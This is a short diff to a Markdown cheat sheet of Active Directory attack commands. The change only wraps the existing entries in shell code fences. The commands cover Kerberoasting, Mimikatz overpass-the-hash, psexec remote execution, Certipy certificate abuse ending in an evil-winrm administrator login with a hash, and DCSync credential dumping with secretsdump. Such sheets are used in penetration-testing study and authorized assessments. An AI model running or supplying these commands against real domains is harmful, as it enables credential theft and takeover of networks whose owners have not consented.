@@ -121,21 +121,29 @@ GetNPUsers.py domain/user -dc-ip <IP> -no-pass
 ldapsearch -x -H ldap://<IP> -b "dc=domain,dc=com"
 ```
 ## KERBEROASTING
+```sh
 GetSPN.ps1
 Invoke-Kerberoast.ps1
+```
 
 ## OVERPASS THE HASH
+```sh
 sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:PowerShell.exe
+```
 
 ## PSExec
+```sh
 psexec.py <domain>/<user>:<pass>@<IP>
-
+```
 ## AD CS ATTACK
+```sh
 certipy find -dc-ip <IP> -u <user> -p <pass>
 certipy req -ca <CA_NAME> -target <DC> -u <user> -p <pass>
 certipy auth -pfx <admin.pfx> -dc-ip <IP>
 evil-winrm -i <target> -u administrator -H <HASH>
-
+```
 ## DCSYNC ATTACK
+```sh
 secretsdump.py <domain>/<user>@<IP> -hashes <HASH>
 rpcclient -U "" <IP>
+```
